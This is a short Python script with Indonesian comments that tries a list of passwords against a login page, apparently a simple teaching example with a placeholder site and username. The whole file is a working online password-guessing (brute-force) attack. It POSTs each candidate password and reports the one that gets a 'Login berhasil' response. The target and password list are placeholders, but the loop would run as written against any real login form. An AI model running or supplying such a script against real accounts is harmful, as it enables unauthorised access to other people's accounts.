import requests

# URL target untuk login
login_url = "https://contoh-website.com/login"

# Daftar kata sandi yang akan dicoba
passwords = ["password1", "password2", "password3"]

# Loop melalui daftar kata sandi
for password in passwords:
    # Buat payload data dengan nama pengguna dan kata sandi yang akan diuji
    data = {"username": "nama_pengguna_anda", "password": password}

    # Kirim permintaan POST untuk mencoba login
    response = requests.post(login_url, data=data)

    # Periksa jika login berhasil
    if "Login berhasil" in response.text:
        print(f"Login berhasil dengan kata sandi: {password}")
        break
    else:
        print(f"Gagal login dengan kata sandi: {password}")

